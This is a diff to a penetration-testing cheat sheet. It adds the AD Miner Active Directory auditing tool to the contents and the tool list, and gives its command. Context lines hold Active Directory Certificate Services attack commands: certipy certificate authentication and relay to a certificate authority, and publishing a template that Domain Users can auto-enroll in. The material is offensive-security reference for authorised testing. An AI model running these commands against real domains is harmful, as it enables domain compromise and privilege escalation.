@@ -122,6 +122,7 @@ Thank you for reading.
 	- [Post Exploitation](#post-exploitation-1)
  		- [Active Directory Certificate Services (AD CS)](#active-directory-certificate-services-ad-cs)
 		- [ADCSTemplate](#adcstemplate)
+  		- [ADMiner](#adminer)
 		- [BloodHound](#bloodhound)
 		- [BloodHound Python](#bloodhound-python)
   		- [bloodyAD](#bloodyAD)
@@ -259,6 +260,7 @@ Thank you for reading.
 | --- | --- |
 | ADCSKiller - An ADCS Exploitation Automation Tool | https://github.com/grimlockx/ADCSKiller |
 | ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
+| ADMiner | https://github.com/Mazars-Tech/AD_Miner |
 | BloodHound Docker | https://github.com/belane/docker-bloodhound |
 | BloodHound | https://github.com/BloodHoundAD/BloodHound |
 | BloodHound | https://github.com/ly4k/BloodHound |
@@ -2871,11 +2873,18 @@ certipy auth -pfx dc.pfx -dc-ip <RHOST> -ldap-shell
 certipy relay -target 'rpc://<CA>' -ca 'CA'
 certipy auth -pfx administrator.pfx -domain <DOMAIN>
 ```
-### ADCSTemplate
+
+#### ADCSTemplate
 
 ```c
 Import-Module .\ADCSTemplate.psm1
 New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '<DOMAIN>\Domain Users'
+```
+
+#### ADMiner
+
+```c
+AD-miner -u <USERNAME> -p <PASSWORD> -cf <NAME>
 ```
 
 #### BloodHound
